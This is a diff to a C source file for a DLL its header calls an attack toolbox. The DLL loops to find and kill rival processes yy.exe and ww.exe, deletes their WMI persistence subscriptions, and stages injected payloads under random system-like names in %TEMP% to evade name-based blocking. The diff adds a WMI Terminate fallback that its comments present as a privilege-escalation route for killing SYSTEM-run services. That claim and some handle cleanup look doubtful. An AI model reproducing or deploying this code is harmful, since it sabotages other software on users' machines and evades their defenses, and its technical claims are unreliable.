@@ -1,4 +1,4 @@
-/*
+﻿/*
  * atkcore.dll - 精简攻击工具箱
  * 功能：循环扫描并终止 yy.exe / ww.exe
  * 保留五种结束方式：
@@ -341,6 +341,102 @@ static void RemoveEnemyWmi(void)
     if (n) WriteKillLog(L"已删除对手 WMI 复活订阅 %d 个对象（Binding/Consumer/Filter 三件套）", n);
 }
 
+/* ================== WMI 兜底杀：Win32_Process.Terminate ==================
+   日志实证：yy 有一部分进程（它自己放的 yysvc.exe，注册成服务跑在 SYSTEM）
+   对我们的 TerminateProcess 一律 err=5 —— 普通管理员令牌打不开 SYSTEM 进程。
+   WMI 的提供程序（WmiPrvSE）以 SYSTEM 身份执行，`Win32_Process.Terminate`
+   就能结束我们令牌够不着的目标。这是用户态里最"干净"的提权路径：
+   不写驱动、不改注册表、不留持久化。 */
+static BOOL WmiTerminateProcess(DWORD pid)
+{
+    IWbemLocator *pLoc = NULL;
+    IWbemServices *pSvc = NULL;
+    IWbemClassObject *pCls = NULL, *pIn = NULL, *pOut = NULL;
+    HRESULT hr, hrExec = E_FAIL;
+    WCHAR objPath[128];
+    BSTR bPath = NULL, bMethod = NULL;
+    BOOL ok = FALSE;
+    BOOL bComInit = FALSE;
+
+    if (pid <= 4) return FALSE;
+
+    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+    if (SUCCEEDED(hr)) bComInit = TRUE;
+    else if (hr != RPC_E_CHANGED_MODE) return FALSE;
+
+    hr = CoCreateInstance(&CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
+                          &IID_IWbemLocator, (void **)&pLoc);
+    if (FAILED(hr) || !pLoc) goto done;
+
+    hr = pLoc->lpVtbl->ConnectServer(pLoc, L"ROOT\\CIMV2", NULL, NULL, NULL, 0,
+                                     NULL, NULL, &pSvc);
+    if (FAILED(hr) || !pSvc) goto done;
+
+    /* 让调用以本进程身份走（WmiPrvSE 侧再以 SYSTEM 执行 Terminate） */
+    CoSetProxyBlanket((IUnknown *)pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
+                      RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL,
+                      EOAC_NONE);
+
+    _snwprintf(objPath, _countof(objPath) - 1, L"Win32_Process.Handle=\"%lu\"", pid);
+    objPath[_countof(objPath) - 1] = L'\0';
+
+    bPath = SysAllocString(objPath);
+    if (!bPath) goto done;
+
+    hr = pSvc->lpVtbl->GetObject(pSvc, bPath, 0, NULL, &pCls, NULL);
+    if (FAILED(hr) || !pCls) goto done;
+
+    bMethod = SysAllocString(L"Terminate");
+    if (!bMethod) goto done;
+
+    hr = pCls->lpVtbl->GetMethod(pCls, bMethod, 0, &pIn, NULL);
+    if (FAILED(hr)) goto done;
+
+    /* Terminate 的入参只有一个可选 Reason，传 NULL 入参对象即可（默认 0） */
+    hrExec = pSvc->lpVtbl->ExecMethod(pSvc, bPath, bMethod, 0, NULL, pIn, &pOut, NULL);
+    if (SUCCEEDED(hrExec) && pOut) {
+        VARIANT vRet;
+        VariantInit(&vRet);
+        if (SUCCEEDED(pOut->lpVtbl->Get(pOut, L"ReturnValue", 0, &vRet, NULL, NULL)) &&
+            vRet.vt == VT_I4) {
+            ok = (vRet.lVal == 0);      /* 0 = 成功；2 = 拒绝访问；9 = 路径不存在 */
+            if (!ok)
+                WriteKillLog(L"WMI Terminate PID=%lu 返回 %ld（2=拒绝访问 9=进程不存在）",
+                             pid, vRet.lVal);
+            else
+                WriteKillLog(L"WMI Terminate PID=%lu 成功（SYSTEM 身份兜底）", pid);
+        }
+        VariantClear(&vRet);
+    }
+
+done:
+    if (bMethod) SysFreeString(bMethod);
+    if (bPath) SysFreeString(bPath);
+    if (pIn) pIn->lpVtbl->Release(pIn);
+    if (pOut) pOut->lpVtbl->Release(pOut);
+    if (pCls) pCls->lpVtbl->Release(pCls);
+    if (pSvc) pSvc->lpVtbl->Release(pSvc);
+    if (pLoc) pLoc->lpVtbl->Release(pLoc);
+    if (bComInit) CoUninitialize();
+    return ok;
+}
+
+/* 杀不掉（err=5）时用它兜底；成功后等 300ms 确认退出 */
+static BOOL KillViaWmi(DWORD pid)
+{
+    HANDLE h;
+    if (!WmiTerminateProcess(pid)) return FALSE;
+    h = OpenProcess(SYNCHRONIZE | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+    if (!h) return TRUE;                     /* 打不开基本就是已经没了 */
+    if (WaitForSingleObject(h, 300) == WAIT_OBJECT_0) {
+        WriteKillLog(L"WMI 兜底确认退出 PID=%lu", pid);
+        CloseHandle(h);
+        return TRUE;
+    }
+    CloseHandle(h);
+    WriteKillLog(L"WMI 兜底已下发但进程仍在 PID=%lu", pid);
+    return FALSE;
+}
 /* ================== 注入用 payload 副本（改名 + %TEMP%） ==================
    对手按名字拦/删 payload.dll、payload.bin，换成 %TEMP% 下的随机"系统 dll"名即可
    同时绕过反注入名单和删文件名单；副本被删会在下一轮重做。 */
@@ -1824,7 +1920,10 @@ static BOOL KillFast(DWORD pid)
             ok = FALSE;
         }
     } else {
-        WriteKillLog(L"KillFast 失败 PID=%lu err=%lu", pid, GetLastError());
+        DWORD err = GetLastError();
+        WriteKillLog(L"KillFast 失败 PID=%lu err=%lu -> 走 WMI 兜底", pid, err);
+        CloseHandle(hProc);
+        return KillViaWmi(pid);
     }
     CloseHandle(hProc);
     return ok;
@@ -2491,6 +2590,7 @@ BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
     }
     return TRUE;
 }
+
 
 
 
